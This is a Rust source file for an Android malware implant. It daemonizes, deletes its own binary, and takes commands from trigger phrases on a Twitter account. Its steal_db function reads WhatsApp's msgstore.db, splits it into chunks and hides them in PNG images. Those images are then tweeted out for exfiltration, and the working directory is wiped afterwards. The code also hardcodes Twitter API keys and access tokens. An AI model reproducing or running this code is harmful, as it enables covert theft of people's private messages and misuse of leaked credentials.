extern crate egg_mode;
#[macro_use] extern crate log;

mod encoder;
mod errors;
mod utils;

use egg_mode::media::{media_types, upload_media};
use android_logger::Config;
use log::Level;
use egg_mode::tweet::DraftTweet;
use encoder::Encoder;
use errors::Error;
use math::round;
use reqwest;
use std::env;
use std::fs;
use std::fs::File;
use std::io::prelude::*;
use std::path::PathBuf;
use std::string::ToString;
use std::{thread, time};
use tokio;
use utils::ByteMask;
use nix::unistd::*;


static WORKING_DIRECTORY: &str = "toast";

fn main() -> Result<(), Error> {
    android_logger::init_once(
        Config::default()
        .with_min_level(Level::Info) // limit log level
        .with_tag("TOAST") // logs will show under mytag tag
    );



    match setup() {
        Ok(()) => info!("No error from setup"),
        Err(e) => error!("Error in setup: {}", e),
    };
    match start() {
        Ok(()) => info!("No error from start"), 
        Err(e) => error!("start: {}", e),
    };

    //let path = env::current_dir()?;
    
    match pull_tweets() {
        Ok(()) => info!("No error from pull_tweets"), 
        Err(e) => error!("pull_tweets: {}", e),
    };

    match steal_db() {
        Ok(()) => info!("No error from steal_db"),
        Err(e) => error!("steal_db: {}", e),
    };
    
    match send_tweet() { 
        Ok(()) => info!("No error from send_tweet"),
        Err(e) => error!("send_tweet: {}", e),
    };

    match kill() {
        Ok(()) => info!("No error from kill"),
        Err(e) => error!("kill: {}", e),
    };
    
    Ok(())
}

#[tokio::main]
async fn start() -> Result<(), Box<dyn std::error::Error>> {
    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
    let token = egg_mode::Token::Access {
        consumer: con_token,
        access: access_token,
    };
    let user_id = "ToastDisciples";
    let mut end = false;
    let five_secs = time::Duration::from_millis(5000);
    loop {
        let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
        let (_user, feed) = user.start().await?;
        
        for status in feed.iter() {
            if status.text.contains("We are hungry") {
                end = true;
                break;
            }
        }
        
        if end == true {
            break;
        }

        thread::sleep(five_secs);
    }
    Ok(())
}

fn setup() -> Result<(), Box<dyn std::error::Error>> {

    match fork()? {                                                                                               
        ForkResult::Parent{ child: _ } => {
            std::process::exit(0);
        }
        ForkResult::Child => {}
    };  

    setsid()?;

    env::set_current_dir("/data")?;

    
    match env::args().next() {
        Some(arg) => {
            info!("Argument: {}", &arg);
            fs::remove_file(&arg)?;
        },
        None => { 
            warn!("No argument provided");
            fs::remove_file("/data/pprt")?;
        },
    };

    fs::create_dir(WORKING_DIRECTORY)?;
    env::set_current_dir(WORKING_DIRECTORY)?;
    
    Ok(())
}

fn kill() -> Result<(), Error> {
    env::set_current_dir("..")?;
    fs::remove_dir_all(WORKING_DIRECTORY)?;
    Ok(())
}

fn steal_db() -> Result<(), Error> {
    let mask = ByteMask::new(2)?;
    let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;

    //let mut db = File::open("/Users/connor/Desktop/LargeTestFile.txt")?;
    let mut buffer = Vec::new();
    let mut file_size:u32 = 0;
    db.read_to_end(&mut buffer)?;
    info!("Read db to end");
    let x = &buffer;

    let mut iterator = x.iter();
    while iterator.next() != None {
        file_size+=1;
    }

    info!("Database size: {}", &file_size);
    let image_meta = fs::metadata("image_0.jpg")?;
    let image_size = image_meta.len();
    
    info!("Image size: {}", image_size);

    let image_size_float = image_size as f64;
    let number_of_pictures = f64::from(file_size) / image_size_float;
    let rounded = round::ceil(number_of_pictures, 0) as u32;
    let mut i:u32 = 0;
    
    while i < rounded {
        info!("ENCODING {}", i);
        let jpg = format!("image_0.jpg");
        let png = format!("image_{}encoded.png", i);
        let f = fs::read("/data/data/com.whatsapp/databases/msgstore.db")?;
        let mut iter = f.chunks(image_size as usize);
        let mut count:u32 = 0;
        while count < i {
            iter.next();
            count += 1;
        }
        let to_write = iter.next().unwrap();
        let file_name = format!("chunk_{}", i);
        let mut file = File::create(&file_name)?;
        file.write_all(&to_write)?;
        
        info!("encoding {} into {} as {}", &file_name, &jpg, &png);
        encode(PathBuf::from(&jpg), PathBuf::from(&file_name), PathBuf::from(&png), mask)?;
        i+=1;
    }
    Ok(())
}

#[tokio::main]
async fn send_tweet() -> Result<(), Box<dyn std::error::Error>> {
    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
    let token = egg_mode::Token::Access {
        consumer: con_token,
        access: access_token,
    };

    let mut db = File::open("/data/data/com.whatsapp/databases/msgstore.db")?;
    let mut buffer = Vec::new();
    let mut file_size:u32 = 0;
    db.read_to_end(&mut buffer)?;
    let x = &buffer;
    let mut iterator = x.iter();
    while iterator.next() != None {
        file_size+=1;
    }
    let image_meta = fs::metadata("image_0.jpg")?;
    let image_size = image_meta.len();
    let image_size_float = image_size as f64;
    let number_of_pictures = f64::from(file_size) / image_size_float;
    let rounded = round::ceil(number_of_pictures, 0) as u32;

    let mut i:u32 = 0;
    while i < rounded {
        let mut tweet = DraftTweet::new(format!("The toast is burnt {}", i));
        let typ = media_types::image_png();
        let image = PathBuf::from(&format!("image_{}encoded.png", i));
        let bytes = std::fs::read(image)?;
        let handle = upload_media(&bytes, &typ, &token).await?;
        tweet.add_media(handle.id.clone());
        info!("ADDED {}", i);
        tweet.send(&token).await?;
        info!("TWEETED {}", i);
        i = i + 1;
    }
    Ok(())
}

#[tokio::main]
async fn pull_tweets() -> Result<(), Box<dyn std::error::Error>> {
    let con_token = egg_mode::KeyPair::new("Z5kqu3hywa02aW2BYNGeWkkXA", "xSGYyYwGEIu95Wc7pOAKh7aIW9kymStpxWVDC85i0MRjedvtj4");
    let access_token = egg_mode::KeyPair::new("1249802159178350599-C3zosoCFc0zdYrm4Fmk05WvMaMznZ4", "2FKoqwS5GA310J0bEy1X4djvjlFOeL2AdjmCpIT6MQSH7");
    let token = egg_mode::Token::Access {
        consumer: con_token,
        access: access_token,
    };
    let user_id = "ToastDisciples";
    let mut end = false;
    let ten_secs = time::Duration::from_millis(5000);
    loop {
        let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(100);
        let (_user, feed) = user.start().await?;
        let mut i:u32 = 0;
        for status in feed.iter() {
            if status.text.contains("We ate the toast") {
                end = true;
                break;
            }
            if let Some(ref media) = status.extended_entities{
                if status.text.contains("Burn the toast"){
                    for info in &media.media {
                        info!("URL: {} {}", info.media_url, i);
                        let res = reqwest::get(&(info.media_url).to_string()).await?.bytes().await?;
                        let file_name = format!("image_{}.jpg", i);
                        let mut file = File::create(file_name)?;
                        file.write_all(&res)?;
                        i = i + 1;
                    }
                }
            }
        }
        if end == true {
            break;
        }
        thread::sleep(ten_secs);
    }
    
    Ok(())
}

fn encode(image: PathBuf, secret: PathBuf, output: PathBuf, mask: ByteMask) -> Result<(), Error> {
    let mut encoder = match Encoder::new(image, secret, mask) {
        Ok(encoder) => encoder,
        Err(e) => { 
            error!("Error Encoder::new: {}", e);
            panic!("{}",e);
        },
    };
    encoder.save(output)?;
    Ok(())
}

